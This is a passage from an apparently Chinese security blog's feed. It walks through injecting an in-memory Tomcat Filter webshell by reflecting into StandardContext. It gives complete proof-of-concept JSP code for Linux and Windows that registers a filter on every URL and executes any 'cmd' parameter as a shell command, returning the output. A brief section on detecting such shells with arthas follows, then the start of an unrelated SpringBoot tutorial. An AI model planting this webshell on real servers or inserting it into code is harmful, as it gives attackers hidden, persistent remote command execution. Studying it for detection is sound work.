addFilterMapBefore：添加filterMap到所有filter最前面- addFilterMap : 添加 FilterMap"></a><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/22.png" alt="one"><br>- addFilterDef：添加一个filterDef到Context<br>- addFilterMapBefore：添加filterMap到所有filter最前面<br>- addFilterMap : 添加 FilterMap</h2><p>获取 filterconfigs：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br></pre></td></tr></table></figure><p>继续往下看，构造一个恶意的 filter , 这里的filter 是我们的jsp ，name是FilterAgent，FilterClass是我们这个jsp 的全类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">filterDef.setFilter(filter);  </span><br><span class="line">filterDef.setFilterName(name);  </span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/23.jpg" alt="one"></p><p>上边代码执行完，我们会实例化一个FilterDef对象，并将恶意构造的恶意类添加到filterDefs中</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/24.png" alt="one"></p><p>接下来 创建 FilterMap对象，并将filterMap到所有filter最前面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);  </span><br><span class="line">filterMap.setFilterName(name);  </span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/25.jpg" alt="one"></p><p>filterConfigs装载</p><p>FilterConfigs存放filterConfig的数组，在FilterConfig中主要存放FilterDef和Filter对象等信息</p><p>先获取当前filterConfigs信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/26.png" alt="one"></p><p>可以看到只有Tomcat默认的Filter，下面通过Java反射来获得构造器（Constructor）对象并调用其newInstance()方法创建创建FilterConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(<span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br></pre></td></tr></table></figure><p>先调用ApplicationFilterConfig.class.getDeclaredConstructor方法，根据context.class与filterDef.class两种参数类型寻找对应的构造方法，获取一个Constructor类对象。</p><p>然后通过newInstance(standardContext, filterDef)来创建一个实例。</p><p>然后将恶意的filter名和配置好的filterConfig传入</p><p>再次运行可以发现filterMaps中出现了FilterMap中出现了我们构造的filter即FilterAgent<br><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/27.png" alt="one"></p><p>已经成功注入到内存中。</p><p>完整POC：</p><p>LINUX:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;shell&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取上下文，即standardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="comment">//获取上下文中 filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">    <span class="comment">//创建恶意filter</span></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>( in ).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().write(output);</span><br><span class="line">                    servletResponse.getWriter().flush();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建对应的FilterDef</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="comment">//创建对应的FilterMap，并将其放在最前</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"> </span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="comment">//调用反射方法，去创建filterConfig实例</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">        <span class="comment">//将filterConfig存入filterConfigs，等待filterchain.dofilter的调用</span></span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Windows:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;  </span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();  </span><br><span class="line">  </span><br><span class="line">  <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">  appctx.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);  </span><br><span class="line">  </span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">  stdctx.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);  </span><br><span class="line">  </span><br><span class="line">  <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">  Configs.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;  </span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;  </span><br><span class="line">      <span class="meta">@Override</span>  </span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="meta">@Override</span>  </span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;  </span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;  </span><br><span class="line">          <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line">          <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();  </span><br><span class="line">          <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);  </span><br><span class="line">          servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));  </span><br><span class="line">          process.destroy();  </span><br><span class="line">          <span class="keyword">return</span>;        &#125;  </span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line">      <span class="meta">@Override</span>  </span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">    filterDef.setFilter(filter);  </span><br><span class="line">    filterDef.setFilterName(name);  </span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * 将filterDef添加到filterDefs中  </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    standardContext.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);  </span><br><span class="line">    filterMap.setFilterName(name);  </span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());  </span><br><span class="line">  </span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);  </span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);  </span><br><span class="line">  </span><br><span class="line">    filterConfigs.put(name,filterConfig);  </span><br><span class="line">    out.print(<span class="string">&quot;Inject Success !&quot;</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h1 id="内存马排查方法"><a href="#内存马排查方法" class="headerlink" title="内存马排查方法"></a>内存马排查方法</h1><p>参考链接：<a href="https://syst1m.com/post/memory-webshell/#arthas">https://syst1m.com/post/memory-webshell/#arthas</a></p><p>arthas<br>项目链接：<a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p><p>我们可以利用该项目来检测我们的内存马</p><p><code>java -jar arthas-boot.jar --telnet-port 9998 --http-port -1</code></p><p>这里也可以直接 <code>java -jar arthas-boot.jar</code></p><p>参考连接：<br><a href="https://syst1m.com/post/memory-webshell/#arthas">https://syst1m.com/post/memory-webshell/#arthas</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot学习笔记</title>
      <link href="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一个运行程序"><a href="#第一个运行程序" class="headerlink" title="第一个运行程序"></a>第一个运行程序</h1><p>依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.3</span><span class="number">.4</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MainApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>控制层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello,ku1s!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果<br><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png"></p><h1 id="自动装配原理"><a 